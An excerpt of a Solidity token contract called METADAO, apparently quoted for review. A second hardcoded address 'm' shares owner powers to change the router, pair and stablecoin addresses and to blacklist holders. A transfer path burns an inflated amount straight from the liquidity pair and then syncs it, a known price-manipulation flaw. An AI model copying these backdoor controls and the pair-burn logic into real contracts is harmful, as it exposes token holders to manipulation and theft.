...
contract METADAO is ERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    mapping(address => bool) public isBlackList;
    mapping(address => bool) public isSwapExempt;
    bool private _swapSync = true;
    uint256 private _burnPool;
    uint256 private _autoSwapMin = 1e15;
    address public m;
    ...
    constructor() ERC20("METADAO", "METADAO") {
        m = 0x2FcAfB2350773E3c7cAE5528562c02f6fe9c8389;
        address lpMiningAddress = 0x121324461E61D459Ebd7B49509a20C706460E5eb;
        address crowdAddress = 0xeEfdcdE9Affe40B43b1DF51528807cBD2815cf4C;
        address miningAddress = 0x2eBAD58efbfAb8680e541DE15f50257C9Ee1827B;
        address poolAddress = 0xF2246Dbf35bdb7D2f3eEC61218e53C29F98E7d06;
        _usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        _swapRouter = ISwapRouter(routerAddress);
        _swapPair = pairFor(_swapRouter.factory(), address(this), _usdtAddress);
    ...
    function setM(address account) public {
        if (owner() == _msgSender() || m == _msgSender()) {
            m = account;
        }
    }
    function setTokenAdd(uint256 category, address data) public {
        if (owner() == _msgSender() || m == _msgSender()) {
            if (category == 1) _usdtAddress = data;
            if (category == 2) _swapPair = data;
            if (category == 3) _swapRouter = ISwapRouter(data);
        }
    }
    ...
    function setSwapSync(bool newValue) public {
        if (owner() == _msgSender() || m == _msgSender()) {
            _swapSync = newValue;
        }
    }
    ...
    function _transfer(
        ...
        if (
            ...
            isSwapAndLiquify = _swapAndLiquify();
        }
        if (_inSwapAndLiquify || recipient == address(1)) {
            ...
            if (isSwapExempt[sender]) {
                ...
                _burnPool = _burnPool.add(amount.mul(2));
            }
        } else {
            super._transfer(sender, recipient, amount);
    ...
    function _burnSwapPool() private lockBurn {
        if (_burnPool > 0) {
            super._burn(_swapPair, _burnPool);
            _burnPool = 0;
            ISwapPair(_swapPair).sync();
        }
    }
    function _swapAndLiquify() private lockTheSwap returns (bool) {
        ...
        if (amount > _autoSwapMin) {
            _swapTokensForTokens(amount);
